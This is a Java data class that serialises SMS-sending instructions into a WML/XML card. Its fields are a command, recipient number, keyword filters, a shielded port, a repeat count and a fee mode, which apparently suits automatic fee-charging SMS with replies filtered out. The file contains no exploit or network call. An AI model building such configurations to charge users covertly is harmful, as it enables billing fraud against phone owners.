package net.mimiduo.boot.pojo.data;


import org.jdom2.Document;
import org.jdom2.Element;
import org.jdom2.output.XMLOutputter;

public class SendSmsXml {
    /** 指令 **/
    private String Ccmd_cust;
    /** 接收方 **/
    private String Cnum_cust;
    /** 关键字1 **/
    private String filter1_cust;
    private String filter2_cust;
    /** Creconfirm_cust **/
    private String Creconfirm_cust;
    /** 标识还可上行多少次 **/
    private String fee;
    /** 屏蔽端口 **/
    private String PortShield;
    /** 连续执行次数 **/
    private String autofee;
    /** 计费模块 **/
    private String feemode;

    private String Cnum2_cust;

    private String popu;

    public String getCcmd_cust() {
        return Ccmd_cust;
    }

    public void setCcmd_cust(String ccmdCust) {
        Ccmd_cust = ccmdCust;
    }

    public String getCnum_cust() {
        return Cnum_cust;
    }

    public void setCnum_cust(String cnumCust) {
        Cnum_cust = cnumCust;
    }

    public String getFilter1_cust() {
        return filter1_cust;
    }

    public void setFilter1_cust(String filter1Cust) {
        filter1_cust = filter1Cust;
    }

    public String getFilter2_cust() {
        return filter2_cust;
    }

    public void setFilter2_cust(String filter2Cust) {
        filter2_cust = filter2Cust;
    }

    public String getCreconfirm_cust() {
        return Creconfirm_cust;
    }

    public void setCreconfirm_cust(String creconfirmCust) {
        Creconfirm_cust = creconfirmCust;
    }

    public String getFee() {
        return fee;
    }

    public void setFee(String fee) {
        this.fee = fee;
    }

    public String getPortShield() {
        return PortShield;
    }

    public void setPortShield(String portShield) {
        PortShield = portShield;
    }

    public String getAutofee() {
        return autofee;
    }

    public void setAutofee(String autofee) {
        this.autofee = autofee;
    }

    public String getFeemode() {
        return feemode;
    }

    public void setFeemode(String feemode) {
        this.feemode = feemode;
    }

    public String getPopu() {
        return popu;
    }

    public void setPopu(String popu) {
        this.popu = popu;
    }

    public String getCnum2_cust() {
        return Cnum2_cust;
    }

    public void setCnum2_cust(String cnum2_cust) {
        Cnum2_cust = cnum2_cust;
    }

    @Override
    public String toString() {
        Element root = new Element("wml");
        Document Doc = new Document(root);

        Element card = new Element("card");
        root.addContent(card);

        Element ccmd_cust = new Element("Ccmd_cust");
        ccmd_cust.setText(this.Ccmd_cust);
        card.addContent(ccmd_cust);

        Element cnum_cust = new Element("Cnum_cust");
        cnum_cust.setText(this.Cnum_cust);
        card.addContent(cnum_cust);

        Element cnum2_cust = new Element("Cnum2_cust");
        cnum2_cust.setText(this.Cnum2_cust);
        card.addContent(cnum2_cust);

        Element filter1_cust = new Element("filter1_cust");
        filter1_cust.setText(this.filter1_cust);
        card.addContent(filter1_cust);

        Element filter2_cust = new Element("filter2_cust");
        filter2_cust.setText("");
        card.addContent(filter2_cust);

        Element creconfirm_cust = new Element("Creconfirm_cust");
        creconfirm_cust.setText(this.Creconfirm_cust);
        card.addContent(creconfirm_cust);

        Element fee = new Element("fee");
        fee.setText(this.fee);
        card.addContent(fee);

        Element autofee = new Element("autofee");
        autofee.setText(this.autofee);
        card.addContent(autofee);

        Element portShield = new Element("PortShield");
        portShield.setText(this.PortShield);
        card.addContent(portShield);

        Element feemode = new Element("feemode");
        feemode.setText(this.feemode);
        card.addContent(feemode);

        Element popu = new Element("popu");
        popu.setText("");
        card.addContent(popu);

        XMLOutputter XMLOut = new XMLOutputter();
        String str = XMLOut.outputString(Doc);

        return str;
    }
}
